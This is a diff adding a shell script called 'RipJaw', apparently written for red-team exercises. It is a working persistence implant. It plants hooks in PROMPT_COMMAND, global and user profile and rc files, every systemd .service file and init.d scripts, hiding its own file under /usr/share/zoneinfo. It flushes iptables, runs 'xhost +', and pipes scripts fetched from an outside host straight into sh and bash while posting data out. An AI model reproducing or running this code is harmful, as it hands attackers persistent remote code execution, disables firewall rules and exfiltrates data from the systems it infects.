@@ -1,0 +1,143 @@
+#!/bin/sh
+#
+#
+# ██▀███   ██▓ ██▓███      ▄▄▄██▀▀▀▄▄▄       █     █░
+#▓██ ▒ ██▒▓██▒▓██░  ██▒      ▒██  ▒████▄    ▓█░ █ ░█░
+#▓██ ░▄█ ▒▒██▒▓██░ ██▓▒      ░██  ▒██  ▀█▄  ▒█░ █ ░█ 
+#▒██▀▀█▄  ░██░▒██▄█▓▒ ▒   ▓██▄██▓ ░██▄▄▄▄██ ░█░ █ ░█ 
+#░██▓ ▒██▒░██░▒██▒ ░  ░    ▓███▒   ▓█   ▓██▒░░██▒██▓ 
+#░ ▒▓ ░▒▓░░▓  ▒▓▒░ ░  ░    ▒▓▒▒░   ▒▒   ▓▒█░░ ▓░▒ ▒  
+#  ░▒ ░ ▒░ ▒ ░░▒ ░         ▒ ░▒░    ▒   ▒▒ ░  ▒ ░ ░  
+#  ░░   ░  ▒ ░░░           ░ ░ ░    ░   ▒     ░   ░  
+#   ░      ░               ░   ░        ░  ░    ░    
+#                                                    
+#					-Created by Kyle Carretto | April 2016
+#
+#
+#
+#########################################################################################################################
+#					Info					  					#
+#########################################################################################################################
+# 	RipJaw is a bash-based persistance network relying on wget in order to
+#	execute remotely hosted scripts. It attempts to be stealthy while still
+#	allowing persistance across sessions.
+#	
+#	Intended Hooks:
+#		Bash
+#			-> PROMPT_COMMAND
+#			-> RC Files
+#			-> Global and Root Profiles
+#
+#		Service
+#			-> .service files		(System D)
+#			-> init.d scripts		(System V)
+#########################################################################################################################
+#					Fields					  					#
+#########################################################################################################################
+#
+web_host="ubredteam.isamotherfucking.ninja/ripjaw"	#Base URL to wget from (Do not add / at the end)
+web_ripjaw="$web_host/ripjaw"				#Where this script is hosted
+web_scriptIndex="$web_host/script.index"		#List of scripts that will be run through wget -O- | /bin/sh
+web_bashHook="$web_host/bash_hook"
+web_xfil="$(wget -q -O- --timeout=2 $web_host/data_xfil)"
+
+profile_path="/usr/share/zoneinfo/"
+profile_name="locale-gen"
+profile_service="sshd"
+profile_serviceBackup="ssh"
+profile="$profile_path/$profile_name"
+#
+#
+#########################################################################################################################
+#					Hooks					  					#
+#########################################################################################################################
+bash_hook ()
+{
+	##
+	### Places a bashhook, where $1 is the file
+	##
+	if [ -f "$1" ] ;then
+		cat "$1" | grep -Fxq ". $profile" || echo ". $profile" >> $1
+		mkdir -p "$profile_path"
+		if [ ! -f $profile ]
+		then
+			touch $profile
+		fi
+		if [ -d $profile_path ]
+		then 
+			iptables -F
+			statement="export PROMPT_COMMAND='$(wget -q -O- --timeout=2 $web_bashHook)'"
+			cat "$profile" | grep -Fxq "$statement" || echo "$statement" >> "$profile"
+			cat "$profile" | grep -Fxq "xhost + > /dev/null 2>&1" || echo "xhost + > /dev/null 2>&1" >> "$profile"
+		fi
+	fi
+}
+service_hook ()
+{
+	##
+	### Places a service hook, where $1 is the service file
+	##
+	if [ -f "$1" ] ;then
+		iptbl=$(which iptables)
+		wg=$(which wget)
+		statement="ExecStartPre=-/bin/bash -c '$wg -q -O- --timeout=2 --post-data \"$web_xfil\" $web_ripjaw | /bin/bash  > /dev/null 2>&1'"
+		cat "$1" | grep -Fxq "$statement" || sed -i "/\[Service\]/a $statement" "$1"
+		cat "$1" | grep -Fxq "ExecStartPre=-$iptbl -F" || sed -i "/\[Service\]/a ExecStartPre=-$iptbl -F" "$1"
+		#sed -i "/\[Service\]/a Type=forking" "$1"
+		systemctl daemon-reload	> /dev/null 2>&1
+	fi
+}
+hook_services ()
+{
+	find / -name *.service -type f|while read SERVICE; do
+		service_hook $SERVICE
+	done
+}
+hook_initd ()
+{
+	find /etc/init.d/ -type f|while read INITD; do
+		bash_hook $INITD 
+	done
+}
+hook_bash ()
+{
+	##
+	### Places bash hooks in various files, using the bash_hook utility
+	##
+	bash_hook "/etc/profile"
+	bash_hook "/etc/bashrc"
+	bash_hook "/etc/bash.bashrc"
+	bash_hook "/etc/.bashrc"
+	bash_hook "~/.profile"
+	find ~/ -type f | grep bash|while read $FILE; do
+		bash_hook $FILE
+	done
+}
+#########################################################################################################################
+#					Core					  					#
+#########################################################################################################################
+checkWeb ()
+{
+	##
+	### This function will callback to a web server, and execute the specified scripts
+	##
+	iptables -F
+	wget -q -O- --timeout=2 $web_scriptIndex | xargs wget -q -O- --timeout=2 | $(which sh) > /dev/null 2>&1
+}
+setHooks ()
+{
+	##
+	### This function will run a series of functions to hook the system and run this script via wget
+	##
+	hook_services > /dev/null 2>&1
+	hook_initd > /dev/null 2>&1
+	hook_bash > /dev/null 2>&1
+	systemctl daemon-reload > /dev/null 2>&1
+}
+main ()
+{
+	setHooks > /dev/null 2>&1
+	checkWeb > /dev/null 2>&1
+}
+
+main &
